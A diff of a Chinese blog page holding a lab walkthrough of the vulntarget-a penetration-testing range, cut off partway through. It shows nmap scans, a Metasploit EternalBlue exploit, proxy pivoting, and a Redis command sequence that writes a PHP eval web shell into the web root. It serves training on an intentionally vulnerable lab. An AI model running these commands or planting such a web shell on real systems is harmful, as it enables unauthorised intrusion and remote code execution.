@@ -1,235 +1,62 @@
-<!DOCTYPE html>
-<html lang=zh>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="vulntarget-a打靶记录">
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="jjjing"/><meta name="copyright" content="jjjing"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="Hexo Theme MEOW"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="vulntarget-a打靶记录 | jjjing"/><meta name="apple-mobile-web-app-title" content="vulntarget-a打靶记录 | jjjing"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="https://jinggg1123.github.io/archives/2022/08/27/vulntaget-a/"/><meta name="description" content="靶机下载链接： vulntarget域渗透靶机：crow821&#x2F;vulntarget: vulntarget靶场系列 (github.com) 拓扑结构 win7信息搜集首先nmap扫一波： 1nmap -sP 192.168.0.0&#x2F;24  得到win7外网机的ip：192.168.0.103 然后扫这个ip： 1nmap 192.168.0.103   发现443端口开放。 m...">
 <meta property="og:type" content="article">
-<meta property="og:title" content="vulntarget-a打靶记录">
-<meta property="og:url" content="https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/index.html">
-<meta property="og:site_name" content="before">
-<meta property="og:description" content="vulntarget-a打靶记录">
+<meta property="og:title" content="vulntarget-a打靶记录 | jjjing">
+<meta property="og:url" content="https://jinggg1123.github.io/archives/2022/08/27/vulntaget-a/index.html">
+<meta property="og:site_name" content="jjjing">
+<meta property="og:description" content="靶机下载链接： vulntarget域渗透靶机：crow821&#x2F;vulntarget: vulntarget靶场系列 (github.com) 拓扑结构 win7信息搜集首先nmap扫一波： 1nmap -sP 192.168.0.0&#x2F;24  得到win7外网机的ip：192.168.0.103 然后扫这个ip： 1nmap 192.168.0.103   发现443端口开放。 m...">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://itsbefore.github.io/images/vulntargeta1.png">
-<meta property="og:image" content="https://itsbefore.github.io/images/vulntargeta2.png">
-<meta property="og:image" content="https://itsbefore.github.io/images/vulntargeta3.png">
-<meta property="og:image" content="https://itsbefore.github.io/images/vulntargeta4.png">
-<meta property="og:image" content="https://itsbefore.github.io/images/vulntargeta5.png">
-<meta property="og:image" content="https://itsbefore.github.io/images/vulntargeta6.png">
-<meta property="og:image" content="https://itsbefore.github.io/images/vulntargeta7.png">
-<meta property="og:image" content="https://itsbefore.github.io/images/vulntargeta8.png">
-<meta property="og:image" content="https://itsbefore.github.io/images/vulntargeta9.png">
-<meta property="og:image" content="https://itsbefore.github.io/images/vulntargeta10.png">
-<meta property="og:image" content="https://itsbefore.github.io/images/vulntargeta11.png">
-<meta property="og:image" content="https://itsbefore.github.io/images/vulntargeta12.png">
-<meta property="og:image" content="https://itsbefore.github.io/images/vulntargeta13.png">
-<meta property="og:image" content="https://itsbefore.github.io/images/vulntargeta14.png">
+<meta property="og:image" content="https://jinggg1123.github.io/archives/2022/08/27/vulntaget-a/assets/images/Hexo-Theme-MEOW.png">
 <meta property="article:published_time" content="2022-08-27T08:11:33.000Z">
-<meta property="article:modified_time" content="2023-12-24T05:50:40.602Z">
-<meta property="article:author" content="before">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://itsbefore.github.io/images/vulntargeta1.png">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>vulntarget-a打靶记录</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
-
-
-    <!-- Umami Analytics -->
-
-
-    <!-- styles -->
-    
+<meta property="article:modified_time" content="2024-12-08T13:23:39.473Z">
+<meta property="article:author" content="jjjing">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://jinggg1123.github.io/archives/2022/08/27/vulntaget-a/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>vulntarget-a打靶记录 | jjjing</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
 <link rel="stylesheet" href="/css/style.css">
 
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-<meta name="generator" content="Hexo 6.1.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">首页</a></li><!--
-     --><!--
-       --><li><a href="/archives/">归档</a></li><!--
-     --><!--
-       --><li><a href="/categories/">分类</a></li><!--
-     --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="上一篇" href="/2022/08/29/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="下一篇" href="/2022/08/09/ctfshowssrf/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&text=vulntarget-a打靶记录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&title=vulntarget-a打靶记录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&is_video=false&description=vulntarget-a打靶记录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=vulntarget-a打靶记录&body=Check out this article: https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&title=vulntarget-a打靶记录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&title=vulntarget-a打靶记录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&title=vulntarget-a打靶记录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&title=vulntarget-a打靶记录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&name=vulntarget-a打靶记录&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&t=vulntarget-a打靶记录"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">拓扑结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">win7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">ms17_010</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">win2016</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.1.</span> <span class="toc-text">添加路由</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.2.</span> <span class="toc-text">开启代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.3.</span> <span class="toc-text">proxychains调用nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.4.</span> <span class="toc-text">redis未授权漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.5.</span> <span class="toc-text">连接蚁剑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.6.</span> <span class="toc-text">msf木马</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">win2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.1.</span> <span class="toc-text">定位域控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.2.</span> <span class="toc-text">路由&amp;代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.3.</span> <span class="toc-text">CVE-2020-1472</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.4.</span> <span class="toc-text">impacte获取hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.5.</span> <span class="toc-text">破解hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.6.</span> <span class="toc-text">3389远程登录</span></a></li></ol></li></ol>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        vulntarget-a打靶记录
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">before</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2022-08-27T08:11:33.000Z" class="dt-published" itemprop="datePublished">2022-08-27</time>
-        
-      
-    </div>
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
-    </div>
-
-
-      
-
-    </div>
-  </header>
-  
-
-  <div class="content e-content" itemprop="articleBody">
-    <p>靶机下载链接：</p>
+<link rel="stylesheet" href="/css/third-party/dist/APlayer.min.css">
+<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 6.3.0"></head><body bg-style="none"><div class="post-progressbar-container"><div class="post-progressbar"></div></div><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="主页"><div>jjjing</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"></div><div id="nav-function"><div id="menu-btn"><a href="javascript:void(0);" title="打开菜单"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="主页">jjjing</a></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">「 MEOW 」</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">vulntarget-a打靶记录</h1><div class="post-author"><span>作者: jjjing</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>发表于2022-08-27</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>更新于2024-12-08</span></div></div><div class="post-read"></div></div><div class="post-attribute"><div class="post-categories"><img src="/assets/images/svg/ta/ta-category.svg" class="icon noview" alt="Icon"><span><a class="post-categories-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div></div></div><div class="post markdown" indent="false"><p>靶机下载链接：</p>
 <p><strong>vulntarget域渗透靶机：</strong><a target="_blank" rel="noopener" href="https://github.com/crow821/vulntarget">crow821&#x2F;vulntarget: vulntarget靶场系列 (github.com)</a></p>
-<h1><span id="拓扑结构">拓扑结构</span></h1><p><img src="/images/vulntargeta1.png" alt="vulntargeta1"></p>
+<h1><span id="拓扑结构">拓扑结构</span></h1><p><img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/images/vulntargeta1.png" alt="vulntargeta1"></p>
 <h1><span id="win7">win7</span></h1><h2><span id="信息搜集">信息搜集</span></h2><p>首先nmap扫一波：</p>
-<pre class="line-numbers language-none"><code class="language-none">nmap -sP 192.168.0.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Apache"><div class="codebox"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sP <span class="number">192.168.0.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>得到win7外网机的ip：192.168.0.103</p>
 <p>然后扫这个ip：</p>
-<pre class="line-numbers language-none"><code class="language-none">nmap 192.168.0.103<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Nginx"><div class="codebox"><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> <span class="number">192.168.0.103</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
-<p><img src="/images/vulntargeta2.png" alt="vulntargeta2"></p>
+<p><img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/images/vulntargeta2.png" alt="vulntargeta2"></p>
 <p>发现443端口开放。</p>
 <h2><span id="ms17_010">ms17_010</span></h2><p>尝试使用永恒之蓝漏洞打，用msf：</p>
-<pre class="line-numbers language-none"><code class="language-none">msfconsole
-use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue
-set rhosts 192.168.0.103
-run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Stata"><div class="codebox"><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="keyword">use</span> exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="keyword">set</span> rhosts 192.168.0.103</span><br><span class="line"><span class="keyword">run</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>成功拿到win7的shell。</p>
 <p>执行<code>ipconfig</code>命令，此处显示有两个ip地址：</p>
-<p><img src="/images/vulntargeta3.png" alt="vulntargeta3"></p>
+<p><img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/images/vulntargeta3.png" alt="vulntargeta3"></p>
 <p>想要攻击机能访问到10.0.20.0&#x2F;24的网段，添加一个路由，搞代理。</p>
 <h1><span id="win2016">win2016</span></h1><h2><span id="添加路由">添加路由</span></h2><p>在<code>meterpreter</code>中执行</p>
-<pre class="line-numbers language-none"><code class="language-none">run post&#x2F;multi&#x2F;manage&#x2F;autoroute	#添加路由
-run autoroute -p	#查看路由<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Dockerfile"><div class="codebox"><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span><span class="language-bash"> post/multi/manage/autoroute	<span class="comment">#添加路由</span></span></span><br><span class="line"><span class="keyword">run</span><span class="language-bash"> autoroute -p	<span class="comment">#查看路由</span></span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
-<p><img src="/images/vulntargeta4.png" alt="vulntargeta4"></p>
+<p><img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/images/vulntargeta4.png" alt="vulntargeta4"></p>
 <p>添加完路由后，当前会话可以连接到10.0.20.0&#x2F;24网段。但是我们只能在msf里连通10.0.20.0&#x2F;24网段。我们可以在msf开一个接口作为代理，让所有走这个代理的数据都可以连接到10.0.20.0&#x2F;24网段。</p>
 <h2><span id="开启代理">开启代理</span></h2><p>开启本地代理：</p>
-<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;server&#x2F;socks_proxy
-show options<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Gradle"><div class="codebox"><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary<span class="regexp">/server/</span>socks_proxy</span><br><span class="line">show <span class="keyword">options</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
-<p><img src="/images/vulntargeta5.png" alt="vulntargeta5"></p>
+<p><img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/images/vulntargeta5.png" alt="vulntargeta5"></p>
 <p>信息不变，直接<code>run</code></p>
 <p>可以使用<code>jobs</code>查看当前是否有任务在执行，<code>jobs id -k</code>结束指定任务。</p>
 <h2><span id="proxychains调用nmap">proxychains调用nmap</span></h2><p>然后我们使用proxychains这个工具调用nmap扫描22网段：</p>
-<pre class="line-numbers language-none"><code class="language-none">首先修改配置文件：
-vim &#x2F;etc&#x2F;proxychains4.conf
-最后一行修改为：socks5	127.0.0.1	1080
-
-调用nmap：
-proxychains4 nmap -sT -Pn 10.0.20.0&#x2F;24 -p80		#有时候msf的socks5代理会抽<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Vim"><div class="codebox"><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">首先修改配置文件：</span><br><span class="line"><span class="keyword">vim</span> /etc/proxychains4.<span class="keyword">conf</span></span><br><span class="line">最后一行修改为：socks5	<span class="number">127.0</span>.<span class="number">0.1</span>	<span class="number">1080</span></span><br><span class="line"></span><br><span class="line">调用<span class="keyword">nmap</span>：</span><br><span class="line">proxychains4 <span class="keyword">nmap</span> -sT -Pn <span class="number">10.0</span>.<span class="number">20.0</span>/<span class="number">24</span> -p80		#有时候msf的socks5代理会抽</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>发现10.0.20.99主机的<code>80</code>端口和<code>6379</code>端口是开着的，先给浏览器设置代理：</p>
-<p><img src="/images/vulntargeta6.png" alt="vulntargeta6"></p>
+<p><img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/images/vulntargeta6.png" alt="vulntargeta6"></p>
 <p>再使用浏览器访问下 <a target="_blank" rel="noopener" href="http://10.0.20.99/">http://10.0.20.99/</a> ，是一个php页面，发现有phpinfo.php。</p>
 <p>可以发现网站的路径：C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;</p>
 <h2><span id="redis未授权漏洞">redis未授权漏洞</span></h2><p>在这里直接对6379的端口进行测试：</p>
-<pre class="line-numbers language-none"><code class="language-none">proxychains4 redis-cli -h 10.0.20.99
-config set dir &quot;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;&quot;
-config set dbfilename txx.php
-set 1 &quot;&lt;?php @eval($_POST[&#39;txx&#39;]);?&gt;&quot;
-save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Php-template"><div class="codebox"><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">proxychains4 redis-cli -h 10.0.20.99</span></span><br><span class="line"><span class="language-xml">config set dir &quot;C:/phpStudy/PHPTutorial/WWW/&quot;</span></span><br><span class="line"><span class="language-xml">config set dbfilename txx.php</span></span><br><span class="line"><span class="language-xml">set 1 &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txx&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;</span></span><br><span class="line"><span class="language-xml">save</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path 